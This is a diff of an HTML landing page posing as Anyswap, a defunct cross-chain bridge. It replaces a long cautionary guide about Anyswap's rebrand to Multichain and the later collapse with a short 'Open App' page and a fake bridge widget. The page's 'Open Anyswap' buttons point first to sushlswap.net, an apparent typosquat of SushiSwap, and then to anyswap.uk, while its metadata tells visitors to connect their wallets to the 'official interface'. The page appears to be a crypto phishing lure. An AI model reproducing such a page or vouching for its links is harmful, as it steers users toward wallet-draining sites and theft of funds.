@@ -1,282 +1,45 @@
-<!DOCTYPE html>
-<html dir="ltr" lang="en"><head>
-<meta charset="utf-8"/><meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
-<title>Anyswap — Cross-Chain Bridge</title>
-<meta content="Anyswap is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet." name="description"/>
-<meta content="index,follow,max-image-preview:large" name="robots"/>
-<link href="https://anyswap-v2.github.io/" rel="canonical"/>
-<link href="https://anyswap-v2.github.io/" hreflang="en" rel="alternate"/><link href="https://anyswap-v2.github.io/" hreflang="x-default" rel="alternate"/>
-<meta content="#0F080F" name="theme-color"/>
-<meta content="website" property="og:type"/><meta content="Anyswap — Cross-Chain Bridge" property="og:title"/><meta content="Anyswap is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet." property="og:description"/>
-<meta content="https://anyswap-v2.github.io/" property="og:url"/><meta content="https://anyswap-v2.github.io/og-cover.png" property="og:image"/><meta content="en" property="og:locale"/>
-<meta content="summary_large_image" name="twitter:card"/><meta content="Anyswap — Cross-Chain Bridge" name="twitter:title"/><meta content="Anyswap is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet." name="twitter:description"/><meta content="https://anyswap-v2.github.io/og-cover.png" name="twitter:image"/>
-<link href="favicon.svg" rel="icon" type="image/svg+xml"/><link href="site.webmanifest" rel="manifest"/><link href="static/icon-180.png" rel="apple-touch-icon"/>
-<link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&amp;family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
-<link href="static/style.css" rel="stylesheet"/>
-<script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@graph": [
-    {
-      "@type": "WebSite",
-      "@id": "https://anyswap-v2.github.io/#website",
-      "url": "https://anyswap-v2.github.io/",
-      "name": "Anyswap"
-    },
-    {
-      "@type": "WebPage",
-      "@id": "https://anyswap-v2.github.io/#webpage",
-      "url": "https://anyswap-v2.github.io/",
-      "name": "Anyswap — Cross-Chain Bridge",
-      "description": "Anyswap is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet.",
-      "inLanguage": "en",
-      "isPartOf": {
-        "@id": "https://anyswap-v2.github.io/#website"
-      }
-    },
-    {
-      "@type": "Organization",
-      "@id": "https://anyswap-v2.github.io/#org",
-      "name": "Anyswap",
-      "url": "https://anyswap-v2.github.io/",
-      "logo": "https://anyswap-v2.github.io/og-cover.png"
-    },
-    {
-      "@type": "WebApplication",
-      "@id": "https://anyswap-v2.github.io/#app",
-      "name": "Anyswap",
-      "url": "https://anyswap-v2.github.io/",
-      "applicationCategory": "FinanceApplication",
-      "operatingSystem": "Web",
-      "browserRequirements": "Requires JavaScript",
-      "description": "Anyswap is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet.",
-      "featureList": [
-        "Cross-Chain Bridge",
-        "Bridge across chains, in minutes"
-      ],
-      "isPartOf": {
-        "@id": "https://anyswap-v2.github.io/#website"
-      }
-    },
-    {
-      "@type": "FAQPage",
-      "@id": "https://anyswap-v2.github.io/#faq",
-      "inLanguage": "en",
-      "mainEntity": [
-        {
-          "@type": "Question",
-          "name": "Is Anyswap still active?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Treat Anyswap as a legacy brand. The official Multichain FAQ says Anyswap relaunched as Multichain and that the original Anyswap domain would have no more updates. Later, Chainalysis reported that Multichain ceased operations after unauthorized withdrawals and operational failures."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Did Anyswap become Multichain?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Yes. The official FAQ describes Anyswap as founded as a cross-chain decentralized exchange and relaunched as Multichain to focus on cross-chain infrastructure. That rebrand is the main reason searches for Anyswap often lead to Multichain docs, token pages, and incident reports."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "How did the Anyswap bridge model work?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "The bridge model locked assets on one chain and minted or released corresponding assets on another chain, with SMPC nodes coordinating the cross-chain action. The official bridge docs describe the lock, mint, burn, and release pattern used for wrapped assets."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What happened to Multichain?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Multichain suffered unauthorized withdrawals and then ceased operations, according to Chainalysis' incident analysis. Chainalysis framed the withdrawals as a possible hack or rug pull and noted problems around CEO access, MPC keys, and operational control. That history is central to any Anyswap risk review."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Are ANY and MULTI the same token?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "They are connected historically, not casually interchangeable everywhere. The Multichain FAQ described an ANY to MULTI conversion at a fixed ratio through a one-way process. Because the broader protocol later halted, do not assume an old token-swap instruction is currently usable or low-risk."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What should I check before touching old Anyswap assets?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Start with contract addresses, chain, liquidity, issuer status, bridge backing, wallet approvals, and whether any redemption path still exists. Ethereum.org's bridge overview explains why bridge assets carry extra trust assumptions. For Anyswap or Multichain assets, also read the Chainalysis incident analysis first."
-          }
-        }
-      ]
-    }
-  ]
-}</script></head>
-<body>
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Anyswap - Open App</title><meta name="description" content="anyswap app route for legacy cross-chain swaps: open the official interface, connect your wallet, choose networks, and verify every transaction.">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<link rel="canonical" href="https://anyswap-v2.github.io/"><meta name="theme-color" content="#FFFFFF">
+<meta property="og:type" content="website"><meta property="og:title" content="Anyswap - Open App"><meta property="og:description" content="anyswap app route for legacy cross-chain swaps: open the official interface, connect your wallet, choose networks, and verify every transaction.">
+<meta property="og:url" content="https://anyswap-v2.github.io/"><meta property="og:image" content="https://anyswap-v2.github.io/og-cover.png"><meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Anyswap - Open App"><meta name="twitter:description" content="anyswap app route for legacy cross-chain swaps: open the official interface, connect your wallet, choose networks, and verify every transaction."><meta name="twitter:image" content="https://anyswap-v2.github.io/og-cover.png">
+<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
+<link rel="stylesheet" href="static/style.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://anyswap-v2.github.io/#website", "url": "https://anyswap-v2.github.io/", "name": "Anyswap"}, {"@type": "WebPage", "@id": "https://anyswap-v2.github.io/#webpage", "url": "https://anyswap-v2.github.io/", "name": "Anyswap - Open App", "description": "anyswap app route for legacy cross-chain swaps: open the official interface, connect your wallet, choose networks, and verify every transaction.", "inLanguage": "en", "isPartOf": {"@id": "https://anyswap-v2.github.io/#website"}}, {"@type": "Organization", "@id": "https://anyswap-v2.github.io/#org", "name": "Anyswap", "url": "https://anyswap-v2.github.io/", "logo": "https://anyswap-v2.github.io/og-cover.png", "sameAs": ["https://twitter.com/MultichainOrg", "https://github.com/anyswap", "https://www.coingecko.com/en/coins/multichain", "https://defillama.com/protocol/multichain"]}, {"@type": "WebApplication", "@id": "https://anyswap-v2.github.io/#app", "name": "Anyswap", "url": "https://anyswap-v2.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "anyswap app route for legacy cross-chain swaps: open the official interface, connect your wallet, choose networks, and verify every transaction.", "featureList": ["Legacy Anyswap brand", "Multichain lineage", "Wallet confirmation required"], "isPartOf": {"@id": "https://anyswap-v2.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://anyswap-v2.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "Is Anyswap the same as Multichain?", "acceptedAnswer": {"@type": "Answer", "text": "Anyswap rebranded into Multichain, so many old Anyswap searches refer to the Multichain bridge and router ecosystem. The names are connected, but users should treat old Anyswap guides as historical. Current safety, route status, token contracts, and liquidity need fresh verification before any transaction."}}, {"@type": "Question", "name": "Can I still use Anyswap bridge?", "acceptedAnswer": {"@type": "Answer", "text": "Users should be extremely cautious about using Anyswap or Multichain routes. The project suffered serious operational and security issues, and route availability may not imply safe redemption. Before sending funds, verify official status, token issuer guidance, recent successful transactions, liquidity, and whether a safer canonical bridge exists."}}, {"@type": "Question", "name": "What happened to the ANY token?", "acceptedAnswer": {"@type": "Answer", "text": "ANY was the earlier token associated with Anyswap before Multichain branding and token changes. Holders should verify any migration or exchange handling through official announcements and market listings. A visible on-chain token balance does not prove that a migration is active, that liquidity is deep, or that exchanges support deposits."}}, {"@type": "Question", "name": "Why is my Anyswap transaction pending?", "acceptedAnswer": {"@type": "Answer", "text": "A pending or incomplete Anyswap transaction can come from source-chain confirmation delay, bridge liquidity issues, router problems, destination-chain congestion, or a route that is no longer operating normally. Users should save the transaction hash, check both chain explorers, and avoid sending repeated transfers until the route status is understood."}}, {"@type": "Question", "name": "Are Anyswap bridged tokens canonical?", "acceptedAnswer": {"@type": "Answer", "text": "Not necessarily. A bridged token from Anyswap or Multichain may be a representation issued by the bridge rather than the canonical token for the destination chain. Canonical status depends on the token issuer and chain ecosystem. Users should verify with the token project's official docs before depositing bridged assets into exchanges or protocols."}}, {"@type": "Question", "name": "What is the safest alternative to Anyswap?", "acceptedAnswer": {"@type": "Answer", "text": "The safer alternative is usually the official bridge recommended by the chain or token issuer, such as a network bridge, issuer-supported mint-and-burn system, or well-maintained current bridge with transparent risk disclosures. The best choice depends on the exact asset and chains. A route should be judged by live support, liquidity, and audit history."}}]}]}</script>
+</head><body>
 <header class="site-header">
-<a aria-label="Anyswap" class="brand" href="#top">
-<svg aria-hidden="true" class="brand-mark" viewbox="0 0 32 32"><defs><lineargradient id="g" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="#FBCAFB"></stop><stop offset=".5" stop-color="#F185F1"></stop><stop offset="1" stop-color="#D718D7"></stop></lineargradient></defs><g fill="none" stroke="url(#g)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.4"><circle cx="13" cy="13" r="6.2"></circle><circle cx="20" cy="20" r="6.2"></circle></g></svg>
-<h1>Anyswap</h1>
-</a>
-<nav aria-label="Primary" class="site-nav"><ul class="nav-list"><li><a href="#how-it-worked">How it worked</a></li><li><a href="#status-and-risk">Status &amp; risk</a></li><li><a href="#tokens-and-fees">Tokens &amp; fees</a></li><li><a href="#terms">Terms</a></li><li><a href="#legacy-chain-context">Legacy chain context</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-<span class="header-spacer"></span>
-<a class="cta cta-primary header-cta" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Anyswap</a>
-<button aria-expanded="false" aria-label="Menu" class="nav-toggle"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"></path></svg></button>
+  <a class="brand" href="#top" aria-label="Anyswap"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Anyswap</span></a>
+  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
+  <span class="header-spacer"></span>
+  <a class="btn btn-dark header-cta" href="https://anyswap.uk/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
+  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
 </header>
 <main id="top">
-<section class="hero"><div class="container"><div class="hero-grid">
-<div class="hero-copy">
-<h2 class="hero-title">Bridge across chains, in minutes</h2>
-<p class="lead">A plain-English guide to <strong>Anyswap</strong>, the bridge project that later operated as Multichain and is now a cautionary case study.</p>
-<div class="hero-cta-row"><a class="cta cta-primary" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Anyswap ↗</a><a class="cta cta-secondary" href="#what-is">Learn more</a></div>
-<p class="hero-note">Live preview — open Anyswap to bridge.</p><div class="trust-row"><span class="trust-chip">On-chain</span><span class="trust-chip">Non-custodial</span></div>
-</div>
-<div class="hero-widget">
-<div aria-hidden="true" class="floating-coins"></div>
-<div class="swap-widget" id="app-widget">
-<div class="swap-widget-head"><span>Bridge</span><span class="badge">Bridge</span></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">From</span><span class="swap-amount">1.00</span></div><span class="token-chip" data-slot="from"><span class="token-icon-morph"><img alt="ANY" class="" decoding="async" height="28" loading="lazy" src="any.png" width="28"/></span><span class="token-ticker">ANY</span></span></div>
-<div class="swap-flip-wrap"><button aria-label="Switch" class="swap-flip" type="button"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24"><path d="M7 4v16M7 20l-3-3M7 4l3 3M17 20V4M17 4l3 3M17 20l-3-3"></path></svg></button></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">To</span><span class="swap-amount">~1.00</span></div><span class="token-chip" data-slot="to"><span class="token-icon-morph"><span aria-hidden="true" class="coin-fallback">MULTI</span></span><span class="token-ticker">MULTI</span></span></div>
-<a class="cta cta-primary swap-now-main" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Anyswap ↗</a>
-<p class="swap-note">Preview — open Anyswap to bridge.</p>
-</div>
-</div>
-</div></div></section>
-<section class="section section-alt" id="what-is"><div class="container"><h2>What is Anyswap?</h2><div class="capsule"><strong>Anyswap</strong> began as a cross-chain decentralized exchange and bridge project, then relaunched as Multichain with a broader cross-chain router focus. The official <a href="https://docs.multichain.org/getting-started/faq" rel="noopener noreferrer">Multichain FAQ</a> says the old Anyswap domain would receive no more updates after the rebrand. Today, the name is best understood as legacy infrastructure and history, not a fresh bridge to use casually.</div></div></section>
-<section class="section section-alt" id="how-it-worked">
-<div class="container"><h2>How Anyswap worked</h2><p class="section-intro">Anyswap and Multichain used bridge and router patterns to move token representations across chains. The user-facing idea was simple, but the trust model depended on contracts, liquidity, and MPC-controlled signing.</p>
-<ol class="steps"><li><strong>Lock or route assets</strong><span>A user sent assets into a bridge address or router pool on the source chain.</span></li><li><strong>MPC nodes observed the event</strong><span>The protocol relied on a secure multi-party computation node network to coordinate signing and cross-chain execution.</span></li><li><strong>Mint, release, or pool-match</strong><span>Depending on the asset type, the destination side could mint a wrapped token, release pool liquidity, or leave a pool-share token to redeem later.</span></li><li><strong>Users tracked completion</strong><span>Final delivery depended on chain confirmations, destination liquidity, token support, and the health of the bridge service.</span></li></ol>
-</div>
-</section>
-<section class="section" id="status-and-risk">
-<div class="container"><h2>Current status and risk</h2><p class="section-intro">The important modern context is not only how Anyswap was designed, but what later happened to Multichain operations.</p>
-<div class="cards three"><article class="card"><h3>Rebrand context</h3><p>The official docs state that Anyswap relaunched as Multichain and that the original Anyswap site would have no more updates. Use the <a href="https://docs.multichain.org/getting-started/faq" rel="noopener noreferrer">FAQ</a> as historical source material, not as proof that a route is currently usable.</p></article><article class="card"><h3>Service halt</h3><p>After unauthorized withdrawals and operational issues, Chainalysis reported that Multichain ceased operations and described the event as a possible hack or insider rug pull. Read the <a href="https://www.chainalysis.com/blog/multichain-exploit-july-2023/" rel="noopener noreferrer">Chainalysis incident analysis</a> before treating any legacy bridge contract as low-risk.</p></article><article class="card"><h3>Bridge exposure</h3><p>Cross-chain bridges can concentrate assets and depend on signing, verifier, liquidity, or custody assumptions. Ethereum.org's <a href="https://ethereum.org/bridges/" rel="noopener noreferrer">bridge overview</a> is a useful neutral primer on why these designs need extra review.</p></article></div>
-</div>
-</section>
-<section class="section section-alt" id="tokens-and-fees">
-<div class="container"><h2>Tokens and fees</h2><p class="section-intro">Anyswap content often leads to old ANY, MULTI, or wrapped-token references. Treat those references as historical unless a current, reputable source confirms support.</p>
-<div class="cards three"><article class="card"><h3>ANY to MULTI</h3><p>The Multichain docs describe ANY to MULTI as a one-way conversion at a fixed token ratio through a web portal. That legacy instruction appears in the <a href="https://docs.multichain.org/getting-started/faq" rel="noopener noreferrer">official FAQ</a>, but it should not be read as a current safety endorsement.</p></article><article class="card"><h3>Fee components</h3><p>There is no universal Anyswap fee to quote here. A bridge or router transaction can involve source-chain gas, destination-chain gas, token approval gas, protocol routing charges, and liquidity effects shown by the interface before signing.</p></article><article class="card"><h3>Audit trail</h3><p>Historical audits and reports are available in the <a href="https://github.com/anyswap/Anyswap-Audit" rel="noopener noreferrer">Anyswap-Audit GitHub repository</a>. Audits are useful inputs, but they do not remove operational, key-management, liquidity, or governance risk.</p></article></div>
-</div>
-</section>
-<section class="section" id="terms">
-<div class="container">
-<h2>Key Anyswap Terms</h2>
-<p class="section-intro">These terms appear often in old Anyswap and Multichain materials, so it helps to separate brand history from live usage.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><img alt="ANY" class="coin-icon" decoding="async" height="40" loading="lazy" src="any.png" width="40"/>
-<div><h3>Anyswap</h3><p class="coin-sub">Original cross-chain brand <span class="tag">Legacy</span></p></div>
-</div>
-<p class="coin-intent">Use this term when researching the project's early DEX, bridge, and token history. It later became part of the Multichain story.</p>
-<a class="cta cta-mini swap-now" data-icon="any.png" data-ticker="ANY" href="https://docs.multichain.org/getting-started/faq" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">MULTI</span>
-<div><h3>Multichain</h3><p class="coin-sub">Rebranded router project <span class="tag">Rebrand</span></p></div>
-</div>
-<p class="coin-intent">Multichain was the successor brand focused on cross-chain routing and infrastructure. Current research should include the later service halt and incident record.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="MULTI" href="https://docs.multichain.org/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">BRDG</span>
-<div><h3>Cross-Chain Bridge</h3><p class="coin-sub">Lock, mint, burn, release <span class="tag">Model</span></p></div>
-</div>
-<p class="coin-intent">The bridge model connected two chains by holding assets on one side and issuing or releasing representations on the other. Liquidity and signer assumptions mattered.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="BRDG" href="https://docs.multichain.org/getting-started/how-it-works/cross-chain-bridge" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">RTR</span>
-<div><h3>Cross-Chain Router</h3><p class="coin-sub">Multi-chain transfer layer <span class="tag">Router</span></p></div>
-</div>
-<p class="coin-intent">The router handled native, bridged, and hybrid assets with different liquidity behavior. A route could fail or leave pool-share exposure if destination liquidity was thin.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="RTR" href="https://docs.multichain.org/getting-started/how-it-works/cross-chain-router" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">SMPC</span>
-<div><h3>SMPC Network</h3><p class="coin-sub">Distributed signing model <span class="tag">Trust</span></p></div>
-</div>
-<p class="coin-intent">The signing design split control across nodes rather than relying on one ordinary private key. Later events showed operational control can still become a major risk factor.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="SMPC" href="https://docs.multichain.org/getting-started/how-it-works" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">V5</span>
-<div><h3>AnyswapV5ERC20</h3><p class="coin-sub">Wrapped asset contract family <span class="tag">Token</span></p></div>
-</div>
-<p class="coin-intent">Old bridge docs reference this contract style for minted destination-chain assets. Verify contracts directly before interacting with any token that carries an Anyswap prefix.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="V5" href="https://docs.multichain.org/getting-started/how-it-works/cross-chain-bridge" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section section-alt" id="legacy-chain-context">
-<div class="container">
-<h2>Legacy Chain Context</h2>
-<p class="section-intro">These chains appeared in historical Multichain documentation, but old listings are not live-route confirmations.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><img alt="ETH" class="coin-icon" decoding="async" height="40" loading="lazy" src="eth.png" width="40"/>
-<div><h3>Ethereum</h3><p class="coin-sub">Major source and settlement chain <span class="tag">Historic</span></p></div>
-</div>
-<p class="coin-intent">Many bridge routes used Ethereum as a source, destination, or liquidity hub. Check the exact token contract and avoid assuming an old wrapped asset is redeemable.</p>
-<a class="cta cta-mini swap-now" data-icon="eth.png" data-ticker="ETH" href="https://docs.multichain.org/getting-started/introduction/supported-chains" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="BNB" class="coin-icon" decoding="async" height="40" loading="lazy" src="bnb.png" width="40"/>
-<div><h3>BNB Smart Chain</h3><p class="coin-sub">EVM chain in old docs <span class="tag">Historic</span></p></div>
-</div>
-<p class="coin-intent">BNB Smart Chain was listed in legacy supported-chain materials. That listing should be treated as documentation history, not a current transaction prompt.</p>
-<a class="cta cta-mini swap-now" data-icon="bnb.png" data-ticker="BNB" href="https://docs.multichain.org/getting-started/introduction/supported-chains" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="FTM" class="coin-icon" decoding="async" height="40" loading="lazy" src="ftm.png" width="40"/>
-<div><h3>Fantom</h3><p class="coin-sub">Important incident venue <span class="tag">Caution</span></p></div>
-</div>
-<p class="coin-intent">Fantom routes were central to later Multichain concerns and unauthorized withdrawals. Extra caution is warranted around any remaining bridged representations.</p>
-<a class="cta cta-mini swap-now" data-icon="ftm.png" data-ticker="FTM" href="https://www.chainalysis.com/blog/multichain-exploit-july-2023/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">POLY</span>
-<div><h3>Polygon</h3><p class="coin-sub">EVM chain in old docs <span class="tag">Historic</span></p></div>
-</div>
-<p class="coin-intent">Polygon appeared in legacy chain lists, but route availability should be verified through current official ecosystem tools, not old Anyswap pages.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="POLY" href="https://docs.multichain.org/getting-started/introduction/supported-chains" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="AVAX" class="coin-icon" decoding="async" height="40" loading="lazy" src="avax.png" width="40"/>
-<div><h3>Avalanche C-Chain</h3><p class="coin-sub">EVM chain in old docs <span class="tag">Historic</span></p></div>
-</div>
-<p class="coin-intent">Avalanche C-Chain was part of historical Multichain documentation. Treat any old bridge instructions as stale until independently confirmed.</p>
-<a class="cta cta-mini swap-now" data-icon="avax.png" data-ticker="AVAX" href="https://docs.multichain.org/getting-started/introduction/supported-chains" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="ARB" class="coin-icon" decoding="async" height="40" loading="lazy" src="arb.png" width="40"/>
-<div><h3>Arbitrum</h3><p class="coin-sub">Layer 2 in old docs <span class="tag">Historic</span></p></div>
-</div>
-<p class="coin-intent">Arbitrum appeared as a legacy Layer 2 listing. Prefer current official bridge documentation when moving assets to or from the network.</p>
-<a class="cta cta-mini swap-now" data-icon="arb.png" data-ticker="ARB" href="https://docs.multichain.org/getting-started/introduction/supported-chains" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section" id="compare"><div class="container"><h2>Anyswap vs Multichain vs current bridges</h2><p class="section-intro">The clearest comparison is historical: Anyswap became Multichain, while modern bridge choices should be evaluated through current docs and risk frameworks such as Ethereum.org's <a href="https://ethereum.org/bridges/" rel="noopener noreferrer">bridge guide</a>.</p>
-<div class="table-wrap"><table class="compare-table"><thead><tr><th>Name</th><th>What it means</th><th>How to treat it</th></tr></thead><tbody><tr><td>Anyswap</td><td>Original cross-chain swap and bridge brand</td><td>Use for research and legacy token history</td></tr><tr><td>Multichain</td><td>Rebranded cross-chain router protocol</td><td>Review the service halt and exploit record before interacting</td></tr><tr><td>Current bridge route</td><td>A presently maintained bridge or official chain portal</td><td>Check live docs, contracts, liquidity, fees, and support status</td></tr></tbody></table></div></div></section>
-<section class="section" id="faq"><div class="container"><h2>Anyswap FAQ</h2><div class="faq-list">
-<details open=""><summary><h3>Is Anyswap still active?</h3></summary><div>Treat Anyswap as a legacy brand. The official <a href="https://docs.multichain.org/getting-started/faq" rel="noopener noreferrer">Multichain FAQ</a> says Anyswap relaunched as Multichain and that the original Anyswap domain would have no more updates. Later, Chainalysis reported that Multichain ceased operations after unauthorized withdrawals and operational failures.</div></details>
-<details open=""><summary><h3>Did Anyswap become Multichain?</h3></summary><div>Yes. The official <a href="https://docs.multichain.org/getting-started/faq" rel="noopener noreferrer">FAQ</a> describes Anyswap as founded as a cross-chain decentralized exchange and relaunched as Multichain to focus on cross-chain infrastructure. That rebrand is the main reason searches for Anyswap often lead to Multichain docs, token pages, and incident reports.</div></details>
-<details><summary><h3>How did the Anyswap bridge model work?</h3></summary><div>The bridge model locked assets on one chain and minted or released corresponding assets on another chain, with SMPC nodes coordinating the cross-chain action. The <a href="https://docs.multichain.org/getting-started/how-it-works/cross-chain-bridge" rel="noopener noreferrer">official bridge docs</a> describe the lock, mint, burn, and release pattern used for wrapped assets.</div></details>
-<details><summary><h3>What happened to Multichain?</h3></summary><div>Multichain suffered unauthorized withdrawals and then ceased operations, according to Chainalysis' <a href="https://www.chainalysis.com/blog/multichain-exploit-july-2023/" rel="noopener noreferrer">incident analysis</a>. Chainalysis framed the withdrawals as a possible hack or rug pull and noted problems around CEO access, MPC keys, and operational control. That history is central to any Anyswap risk review.</div></details>
-<details><summary><h3>Are ANY and MULTI the same token?</h3></summary><div>They are connected historically, not casually interchangeable everywhere. The <a href="https://docs.multichain.org/getting-started/faq" rel="noopener noreferrer">Multichain FAQ</a> described an ANY to MULTI conversion at a fixed ratio through a one-way process. Because the broader protocol later halted, do not assume an old token-swap instruction is currently usable or low-risk.</div></details>
-<details><summary><h3>What should I check before touching old Anyswap assets?</h3></summary><div>Start with contract addresses, chain, liquidity, issuer status, bridge backing, wallet approvals, and whether any redemption path still exists. Ethereum.org's <a href="https://ethereum.org/bridges/" rel="noopener noreferrer">bridge overview</a> explains why bridge assets carry extra trust assumptions. For Anyswap or Multichain assets, also read the Chainalysis incident analysis first.</div></details>
-</div></div></section>
+  <section class="hero">
+    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
+    <div class="container">
+      <h1>Anyswap</h1>
+      <div class="bridge-widget" role="group" aria-label="Anyswap preview"><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>USDC</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>USDC</b> · Polygon</span></span></div><a class="btn btn-dark bw-go" href="https://anyswap.uk/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"><img src="static/net-bnb.png" alt="BNB Chain" loading="lazy"><img src="static/net-polygon.png" alt="Polygon" loading="lazy"><img src="static/net-avalanche.png" alt="Avalanche" loading="lazy"><img src="static/net-fantom.png" alt="Fantom" loading="lazy"><img src="static/net-arbitrum.png" alt="Arbitrum" loading="lazy"><img src="static/net-optimism.png" alt="Optimism" loading="lazy"></div>
+      <div class="hero-go"><a class="btn btn-green" href="https://anyswap.uk/" target="_blank" rel="noopener noreferrer">Open Anyswap ↗</a></div>
+      <div class="trust-row"><span class="trust-chip">Legacy Anyswap brand</span><span class="trust-chip">Multichain lineage</span><span class="trust-chip">Wallet confirmation required</span></div>
+    </div>
+  </section>
